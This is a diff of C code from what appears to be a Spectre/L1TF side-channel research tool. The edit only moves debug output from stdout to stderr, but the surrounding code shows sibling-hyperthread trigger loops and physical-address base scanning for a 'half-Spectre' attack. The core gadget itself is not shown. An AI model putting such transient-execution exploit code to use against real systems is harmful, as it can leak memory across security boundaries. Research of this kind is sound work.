@@ -73,8 +73,8 @@ void test_half_spectre(unsigned char *p, uintptr_t pa_p, uintptr_t pa_base)
 	for (int delta_p = 0; delta_p <= 0x200; delta_p += 0x200) {
 		for (int delta_off = 0; delta_off <= 0x200; delta_off += 0x200) {
 			uint64_t off = pa_p - pa_base + delta_off;
-			printf("half_spectre | pa_base = %lx | p's pa = %lx | offset = %lx | idx = %lx ", pa_base, pa_p+delta_p, off, off/8);
-			printf("| hits = %d / 1M\n", do_half_spectre(p + delta_p, off/8, 1000000));
+			fprintf(stderr, "half_spectre | pa_base = %lx | p's pa = %lx | offset = %lx | idx = %lx ", pa_base, pa_p+delta_p, off, off/8);
+			fprintf(stderr, "| hits = %d / 1M\n", do_half_spectre(p + delta_p, off/8, 1000000));
 		}
 	}
 }
@@ -83,15 +83,15 @@ uintptr_t spectre_find_base(char *p, uintptr_t pa_p)
 {
 	const int verbose = 2;
 #if HELPERS
-	if (verbose >= 1) printf("spectre_find_base:     real base = %10lx\n", helper_base_pa());
-	if (verbose >= 1) printf("spectre_find_base:   correct off = %10lx\n", pa_p-helper_base_pa());
+	if (verbose >= 1) fprintf(stderr, "spectre_find_base:     real base = %10lx\n", helper_base_pa());
+	if (verbose >= 1) fprintf(stderr, "spectre_find_base:   correct off = %10lx\n", pa_p-helper_base_pa());
 #endif
 
 	for (int run = 0; run < 1000; run++) {
 		if (verbose >= 2) {
-			printf("l1tf_find_page_pa: run %3d", run);
+			fprintf(stderr, "l1tf_find_page_pa: run %3d", run);
 			fflush(stdout);
-			printf("\33[2K\r");
+			fprintf(stderr, "\33[2K\r");
 		}
 		// uintptr_t start = 0x1000-0x218; uintptr_t end = pa_p;
 		uintptr_t real_off = pa_p-helper_base_pa(); uintptr_t start = real_off - 1000*PAGE_SIZE; uintptr_t end = real_off + 10*PAGE_SIZE;
@@ -99,7 +99,7 @@ uintptr_t spectre_find_base(char *p, uintptr_t pa_p)
 			int hits = do_half_spectre(p, off/8, 10000);
 			if (!hits)
 				continue;
-			printf("spectre_find_base: candidate off = %10lx\n", off);
+			fprintf(stderr, "spectre_find_base: candidate off = %10lx\n", off);
 			test_half_spectre((uint8_t *)p, pa_p, pa_p-off);
 		}
 	}
@@ -135,7 +135,7 @@ static void *spectre_touch_base(void *data)
 {
 	const int verbose = 0;
 	set_cpu_affinity(get_sibling(CPU));
-	if (verbose >= 1) printf("[sibling] starting spectre_touch_base\n");
+	if (verbose >= 1) fprintf(stderr, "[sibling] starting spectre_touch_base\n");
 	static int triggers = 0;
 	uint64_t start = clock_read();
 	while (!sibling_stop) {
@@ -143,12 +143,12 @@ static void *spectre_touch_base(void *data)
 		triggers += 100;
 		if (verbose >= 2) if (triggers % 10000 == 0) {
 			double duration = (clock_read() - start) / 1000000000.0;
-			printf("[sibling] spectre_touch_base: triggers = %10d   triggers/sec: %.1f K", triggers, 0.001*triggers/duration);
+			fprintf(stderr, "[sibling] spectre_touch_base: triggers = %10d   triggers/sec: %.1f K", triggers, 0.001*triggers/duration);
 			fflush(stdout);
-			printf("\33[2K\r");
+			fprintf(stderr, "\33[2K\r");
 		}
 	}
-	if (verbose >= 1) printf("[sibling] exiting spectre_touch_base\n");
+	if (verbose >= 1) fprintf(stderr, "[sibling] exiting spectre_touch_base\n");
 	return NULL;
 }
 
@@ -159,7 +159,7 @@ void spectre_touch_base_start(void)
 		assert(pthread_create(&sibling, NULL, spectre_touch_base, NULL) == 0);
 	}
 	else
-		printf("WARNING: spectre_touch_base_start while sibling is already busy\n");
+		fprintf(stderr, "WARNING: spectre_touch_base_start while sibling is already busy\n");
 }
 
 void spectre_touch_base_stop(void)
@@ -176,7 +176,7 @@ static void *half_spectre(void *data)
 	const int verbose = 0;
 	uint64_t idx = (uint64_t)data;
 	set_cpu_affinity(get_sibling(CPU));
-	if (verbose >= 1) printf("[sibling] starting half_spectre with idx = %lx\n", idx);
+	if (verbose >= 1) fprintf(stderr, "[sibling] starting half_spectre with idx = %lx\n", idx);
 	static int triggers = 0;
 	uint64_t start = clock_read();
 	while (!sibling_stop) {
@@ -184,12 +184,12 @@ static void *half_spectre(void *data)
 		triggers += 100;
 		if (verbose >= 2) if (triggers % 10000 == 0) {
 			double duration = (clock_read() - start) / 1000000000.0;
-			printf("[sibling] half_spectre: triggers = %10d   triggers/sec: %.1f K", triggers, 0.001*triggers/duration);
+			fprintf(stderr, "[sibling] half_spectre: triggers = %10d   triggers/sec: %.1f K", triggers, 0.001*triggers/duration);
 			fflush(stdout);
-			printf("\33[2K\r");
+			fprintf(stderr, "\33[2K\r");
 		}
 	}
-	if (verbose >= 1) printf("[sibling] exiting half_spectre\n");
+	if (verbose >= 1) fprintf(stderr, "[sibling] exiting half_spectre\n");
 	return NULL;
 }
 
@@ -198,13 +198,13 @@ void half_spectre_start(uintptr_t base, uintptr_t pa)
 	const int verbose = 0;
 
 	uint64_t idx = (pa - base) / 8;
-	if (verbose) printf("half_spectre_start: idx = %lx, half-Specre will touch pa %lx\n", idx, base + 8*idx);
+	if (verbose) fprintf(stderr, "half_spectre_start: idx = %lx, half-Specre will touch pa %lx\n", idx, base + 8*idx);
 	if (sibling == -1LU) {
 		sibling_stop = 0;
 		assert(pthread_create(&sibling, NULL, half_spectre, (void *)idx) == 0);
 	}
 	else
-		printf("WARNING: half_spectre_start while sibling is already busy\n");
+		fprintf(stderr, "WARNING: half_spectre_start while sibling is already busy\n");
 }
 
 void half_spectre_stop(void)
